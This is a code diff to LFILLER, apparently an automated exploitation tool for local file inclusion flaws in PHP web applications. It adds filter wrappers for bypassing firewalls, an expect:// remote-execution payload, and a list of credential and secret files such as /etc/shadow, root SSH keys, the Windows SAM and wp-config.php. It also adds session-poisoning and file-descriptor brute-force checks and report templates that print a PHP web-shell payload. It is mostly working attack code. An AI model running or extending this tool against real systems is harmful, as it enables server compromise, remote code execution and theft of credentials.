@@ -60,7 +60,9 @@ class LFILLER:
             'rfi': False,
             'webshell_created': False,
             'webshell_urls': [],
-            'exploitation_stories': []
+            'exploitation_stories': [],
+            'session_files': [],
+            'file_fds': []
         }
         
         self._initialize_comprehensive_data()
@@ -119,30 +121,37 @@ class LFILLER:
             ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
             ('php://input', 'PHP Input'),
             ('expect://id', 'Expect Wrapper (RCE)'),
-            ('expect://whoami', 'Expect Wrapper (RCE)'),
             ('zip:///var/www/html/upload/malicious.jpg%23shell', 'Zip Wrapper (WSTG)'),
-            ('zip:///tmp/malicious.zip%23shell', 'Zip Wrapper (WSTG)'),
+            ('php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', 'Zlib Filter (WAF Bypass)'),
             ('phar:///etc/passwd', 'Phar Wrapper')
         ]
         
         self.interesting_files = [
+            # Linux Standard
             '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
             '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/crontab',
-            '/etc/apache2/apache2.conf', '/etc/nginx/nginx.conf',
-            '/etc/php/7.4/apache2/php.ini', '/etc/php/8.0/apache2/php.ini', 
-            '/etc/php/8.1/apache2/php.ini', '/etc/php/8.2/apache2/php.ini',
-            '/etc/mysql/my.cnf', '/etc/postgresql/postgresql.conf',
-            '/var/www/html/config.php', '/var/www/html/wp-config.php',
-            '/var/www/html/.env', '/var/www/html/settings.php',
-            '/var/www/html/database.php', '/var/www/html/web.config',
-            '/var/log/auth.log', '/var/log/apache2/access.log',
-            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
-            '/var/log/syslog', '/proc/self/environ',
+            '/etc/profile', '/etc/bashrc', '/etc/environment',
             '/root/.bash_history', '/root/.ssh/id_rsa',
             '/home/root/.bash_history', '/home/root/.ssh/id_rsa',
-            '/home/www-data/.bash_history', '/home/www-data/.ssh/id_rsa',
+            '/var/log/auth.log', '/var/log/apache2/access.log',
+            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
+            '/var/log/syslog', '/proc/self/environ', '/proc/version',
+            '/proc/self/cmdline', '/proc/mounts', '/proc/sched_debug',
+            
+            # Windows
+            'C:\\windows\\system32\\drivers\\etc\\hosts',
+            'C:\\windows\\win.ini', 'C:\\windows\\system.ini',
+            'C:\\windows\\Panther\\sysprep.inf',
+            'C:\\windows\\system32\\config\\AppEvent.Evt',
+            'C:\\windows\\repair\\SAM', 'C:\\windows\\repair\\system',
+            
+            # Web Specific
+            '/var/www/html/config.php', '/var/www/html/wp-config.php',
+            '/var/www/html/.env', '/var/www/html/settings.php',
             'config.php.bak', 'database.php.old', '.env.backup',
-            '/proc/self/cmdline', '/proc/version', '/proc/mounts'
+            
+            # FreeBSD / Other
+            '/etc/master.passwd', '/etc/resolv.conf', '/etc/fstab'
         ]
 
     def _apply_encoding(self, payload):
@@ -321,6 +330,49 @@ class LFILLER:
                             self.results['log_poisoning'].append({'log': log_info['log'], 'method': method, 'url': log_info['url']})
                             print(f" {Colors.GREEN}[+]{Colors.END} Log poisoned via {method}: {log_info['log']}")
                         break
+                except: continue
+
+    def check_session_poisoning(self, param):
+        """Advanced PHP Session Poisoning Technique"""
+        print(f"[*] Checking session poisoning on {Colors.CYAN}{param}{Colors.END}...")
+        session_paths = [
+            '/var/lib/php/sessions/sess_', '/tmp/sess_', '/var/lib/php5/sess_',
+            '/var/lib/php/session/sess_'
+        ]
+        
+        php_sessid = self.session.cookies.get('PHPSESSID')
+        if not php_sessid: return
+
+        for path in session_paths:
+            full_path = path + php_sessid
+            for encoded in self._apply_encoding(full_path):
+                separator = '&' if '?' in self.url else '?'
+                test_url = f"{self.url}{separator}{param}={encoded}"
+                try:
+                    r = self.session.get(test_url, timeout=self.timeout)
+                    if r.status_code == 200 and len(r.text) > 5:
+                        with self.lock:
+                            self.results['session_files'].append({'path': full_path, 'url': test_url})
+                            print(f" {Colors.GREEN}[+]{Colors.END} Session file readable: {full_path}")
+                        break
+                except: continue
+
+    def check_file_descriptors(self, param):
+        """File Descriptor brute-forcing (/proc/self/fd/N)"""
+        print(f"[*] Brute-forcing file descriptors on {Colors.CYAN}{param}{Colors.END}...")
+        for i in range(0, 20):
+            fd_path = f"/proc/self/fd/{i}"
+            for encoded in self._apply_encoding(fd_path):
+                separator = '&' if '?' in self.url else '?'
+                test_url = f"{self.url}{separator}{param}={encoded}"
+                try:
+                    r = self.session.get(test_url, timeout=self.timeout)
+                    if r.status_code == 200 and len(r.text) > 50:
+                        if any(s in r.text for s in ['root:', 'localhost', '<?php']):
+                            with self.lock:
+                                self.results['file_fds'].append({'path': fd_path, 'url': test_url})
+                                print(f" {Colors.GREEN}[+]{Colors.END} Open FD found: {fd_path}")
+                            break
                 except: continue
 
     def check_ssh_poisoning(self, param):
@@ -621,6 +673,8 @@ class LFILLER:
             self.check_pearcmd(p)
             self.check_log_poisoning(p)
             self.check_ssh_poisoning(p)
+            self.check_session_poisoning(p)
+            self.check_file_descriptors(p)
             self.check_rfi(p)
             self.execute_shells(p)
             if self.webshell_mode: self.create_webshell(p)
@@ -676,6 +730,32 @@ class LFILLER:
                 f.write("EVIDENCE OF PROOF:\n")
                 f.write(f"Command: curl -i \"{res['url']}\"\n")
                 f.write("-" * 40 + "\n")
+
+        # 1.1 Session Poisoning Reports
+        for i, res in enumerate(self.results['session_files'], 1):
+            report_count += 1
+            filename = os.path.join(domain, f"bounty_SESSION_POISON_{i}.txt")
+            with open(filename, "w") as f:
+                f.write(f"VULNERABILITY: RCE via PHP Session Poisoning ($1000+ Value)\n")
+                f.write("="*40 + "\n")
+                f.write(f"Session Path: {res['path']}\n")
+                f.write(f"LFI URL: {res['url']}\n\n")
+                f.write("EXPLANATION:\n")
+                f.write("PHP session files often store user-controlled data. If this data is poisoned with PHP code, including the session file via LFI results in Remote Code Execution.\n\n")
+                f.write("REPRODUCTION:\n")
+                f.write("1. Set a session variable (e.g., username) to '<?php system($_GET[\"cmd\"]); ?>'\n")
+                f.write(f"2. Access: {res['url']}&cmd=id\n")
+
+        # 1.2 File Descriptor Reports
+        for i, res in enumerate(self.results['file_fds'], 1):
+            report_count += 1
+            filename = os.path.join(domain, f"bounty_FD_INCLUSION_{i}.txt")
+            with open(filename, "w") as f:
+                f.write(f"VULNERABILITY: LFI via File Descriptor (/proc/self/fd)\n")
+                f.write("="*40 + "\n")
+                f.write(f"Path: {res['path']}\n")
+                f.write("EXPLANATION:\n")
+                f.write("Linux file descriptors can hold references to open files, logs, or network streams. Brute-forcing these can bypass restricted directory access.\n")
 
         # 2. Wrapper Reports
         for i, (name, wrapper, url) in enumerate(self.results['php_wrappers'], 1):
